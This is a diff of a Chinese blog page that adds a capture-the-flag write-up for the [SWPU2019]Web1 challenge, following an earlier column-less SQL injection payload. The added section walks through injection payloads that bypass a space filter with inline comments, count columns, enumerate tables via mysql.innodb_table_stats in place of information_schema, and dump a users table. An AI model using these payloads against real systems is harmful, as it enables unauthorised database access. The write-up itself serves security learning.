@@ -470,7 +470,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    495
+                    807
                 </div>
                 
 
@@ -537,6 +537,52 @@
 <h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a>payload：</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> a<span class="token punctuation">,</span>b <span class="token keyword">from</span> posts <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span> concat<span class="token punctuation">(</span><span class="token punctuation">`</span><span class="token number">3</span><span class="token punctuation">`</span><span class="token punctuation">,</span><span class="token number">0x2d</span><span class="token punctuation">,</span><span class="token punctuation">`</span><span class="token number">4</span><span class="token punctuation">`</span><span class="token punctuation">)</span> <span class="token keyword">from</span> <span class="token punctuation">(</span><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> xxx<span class="token punctuation">)</span>a <span class="token keyword">limit</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/98206699">参考博客</a></p>
+<p><strong>习题:</strong></p>
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><p>经过成测试可以知道，这道题，已经被过滤了空格，and，or，<strong>information_scheam</strong>。。。。</p>
+<p>可以<strong>用union查询和无列名注入</strong></p>
+<h3 id="1-查询注入类型"><a href="#1-查询注入类型" class="headerlink" title="1. 查询注入类型"></a>1. 查询注入类型</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxy3k81qwj30wn04iaaj.jpg" alt="image-20210528104442114"></p>
+<p>是<strong>单引号字符型注入</strong></p>
+<h3 id="2-查询当前表的列数以及回显位置"><a href="#2-查询当前表的列数以及回显位置" class="headerlink" title="2. 查询当前表的列数以及回显位置"></a>2. 查询当前表的列数以及回显位置</h3><h4 id="2-1-查看列数"><a href="#2-1-查看列数" class="headerlink" title="2.1 查看列数"></a>2.1 查看列数</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'/**/group/**/by/**/22,'</span><span class="token number">1</span> <span class="token comment">//22是试出来的</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxy6f1mbyj30ui01u74e.jpg" alt="image-20210528104727373"></p>
+<p>没有报错说明是22列</p>
+<h4 id="2-2-查看回显位置"><a href="#2-2-查看回显位置" class="headerlink" title="2.2 查看回显位置"></a>2.2 查看回显位置</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token number">1</span><span class="token string">'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxycz7evrj30xy04mdg3.jpg" alt="image-20210528105344795"></p>
+<p><strong>说明回显位置是2，3</strong></p>
+<h3 id="接下来怎么查表？"><a href="#接下来怎么查表？" class="headerlink" title="接下来怎么查表？"></a>接下来怎么查表？</h3><p>有两种方法：</p>
+<ul>
+<li>利用<code>mysql.innodb_table_stats</code>等表可以代替<code>information_schema</code>,查看链接<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/5aad090eb613">可替代</a></li>
+<li>sqlmap爆破</li>
+</ul>
+<p><strong>mysql库：</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxzi28ms3j30e20740t5.jpg" alt="image-20210528113315139"></p>
+<p><strong>mysql.innodb_table_stats表中的内容</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxzizzfazj30ma049gm6.jpg" alt="image-20210528113408669"></p>
+<p><strong>sys库中的内容:</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxzjvjvvej30cy078aak.jpg" alt="image-20210528113459339"></p>
+<p><strong>sys.schema_table_statistics的内容</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxzkpeegbj30ei08hdgq.jpg" alt="image-20210528113547095"></p>
+<p><strong>sys.x$statement_analysis</strong></p>
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxzu13rqdj30jo0e7t9s.jpg" alt="image-20210528114444930"></p>
+<p>由于第一种方式的其他库也有可能被过滤，所以尝试用<code>sqlmap</code>……</p>
+<p><code>sqlmap</code>检测不出来,还是使用<code>mysql.innodb_table_stats</code>吧</p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,2,(select/**/group_concat(table_name)/**/from/**/mysql.innodb_table_stats),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxyyqz675j30ws05cq3a.jpg" alt="image-20210528111441064"></p>
+<p>直接看users</p>
+<p><strong>采用无列名注入</strong></p>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token operator">-</span><span class="token number">1</span><span class="token string">'union/**/select/**/1,2,(select/**/`3`/**/from(select/**/1,2,3/**/union/**/select/**/*/**/from/**/web1.users)a/**/limit/**/1,1),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'</span><span class="token number">22</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+
+<p><img src="https://tva1.sinaimg.cn/large/008i3skNly1gqxz8f90a5j30kb037jri.jpg" alt="image-20210528112359008"></p>
 
                 
             </div>
